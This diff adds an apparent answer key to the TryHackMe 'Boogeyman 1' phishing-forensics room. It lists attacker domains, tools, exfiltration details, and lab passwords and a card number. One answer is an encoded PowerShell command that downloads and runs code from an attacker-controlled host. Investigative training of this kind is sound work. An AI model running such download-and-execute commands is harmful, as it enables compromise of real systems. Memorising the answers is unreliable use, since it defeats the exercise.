@@ -1,0 +1,60 @@
+Boogeyman 1
+https://tryhackme.com/room/boogeyman1
+
+What is the email address used to send the phishing email?
+agriffin@bpakcaging.xyz
+
+What is the email address of the victim?
+julianne.westcott@hotmail.com
+
+What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?
+elasticemail
+
+What is the name of the file inside the encrypted attachment?
+Invoice_20230103.lnk
+
+What is the password of the encrypted attachment?
+Invoice2023!
+
+Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?
+aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
+
+What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com)
+cdn.bpakcaging.xyz,files.bpakcaging.xyz
+
+What is the name of the enumeration tool downloaded by the attacker?
+seatbelt
+
+What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.
+C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite
+
+What is the software that uses the file in Q3?
+Microsoft Sticky Notes
+
+What is the name of the exfiltrated file?
+protected_data.kdbx
+
+What type of file uses the .kdbx file extension?
+keepass
+
+What is the encoding used during the exfiltration attempt of the sensitive file?
+hex
+
+What is the tool used for exfiltration?
+nslookup
+
+What software is used by the attacker to host its presumed file/payload server?
+python
+
+What HTTP method is used by the C2 for the output of the commands executed by the attacker?
+POST
+
+What is the protocol used during the exfiltration activity?
+dns
+
+What is the password of the exfiltrated file?
+%p9^3!lL^Mz47E2GaT^y
+
+What is the credit card number stored inside the exfiltrated file?
+4024007128269551
+
